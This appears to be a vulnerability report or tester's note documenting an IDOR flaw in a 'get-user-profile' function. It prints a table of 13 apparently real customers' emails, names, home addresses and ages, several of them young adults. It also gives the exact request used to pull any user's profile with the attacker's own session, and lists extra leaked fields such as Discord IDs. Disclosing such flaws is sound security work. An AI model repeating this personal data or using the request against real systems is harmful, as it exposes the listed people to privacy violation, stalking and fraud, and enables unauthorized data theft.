# Customer PII

Pulled through the `get-user-profile` IDOR. 13 accounts (12 resellers + 1 duplicate).

```
email                       name            address              city           country       age
--------------------------  --------------  -------------------  -------------  ------------  ---
henryholt2026@atomicmail.io Henry Holt      4946 Milden Road     Martinez       United States 25
alexmarten68@gmail.com      Hacked ByPoc    kandylane            new york       CY            42
talinsikes4@gmail.com       jayden jay      242sfv               nyc            Other         27
nassimkalashsss@hotmail.com Nassim Kalash   3dsad                amsterdam      Netherlands   25
sabanigino241@gmail.com     Gino SAabani    dre                  wien           Austria       29
cooldeadninja2021@gmail.com issac herm      14841 roscoe blvd    panorama city  United States 21
flixzsmm.shop@gmail.com     kevin atwood    508 e maddison st    Pontiac        United States 21
yuzakirakurotuki@gmail.com  Yusaku Matsuda  350 5th Ave          New York       United States 23
griffin.tierney71@gmail.com griffin tierney 6 Druid Place        Katonah        United States 18
snowj4807@gmail.com         Brandon Burton  300 Groveland Rd     Ortonville     United States 18
damonsutherlin76@gmail.com  Damon Sutherlin 188W 300S            Crawfordsville United States 26
lucabbd46@gmail.com         Jonas Hehl      auf dem hessel 21    erlensee       Germany       19
kathypillans@gmail.com      talin sikes     388callahancr        troy           United States 25
```

Notes:

- `talinsikes4@gmail.com` and `kathypillans@gmail.com` are the same person (talin sikes) — surfaced because SilentLock's `support_email` differs from its owner email.
- `alexmarten68@gmail.com` has first name "Hacked ByPoc" and several rows have junk addresses (`242sfv`, `3dsad`, `dre`, `kandylane`) — throwaway/defaced signups, which suggests this data is already being abused.
- Two accounts are 18 and one is 19.

The request that produced this, for each row:

```
POST /functions/v1/get-user-profile
{"sessionToken": "<attacker's own session>", "username": "<victim email>"}
```

The full profile object also returns `id` (uuid), `discord_id`, `discord_username`, `customer_discord_id`, `customer_discord_username`, `created_at`, `updated_at`, `profile_completed`, `tos_accepted_at`.
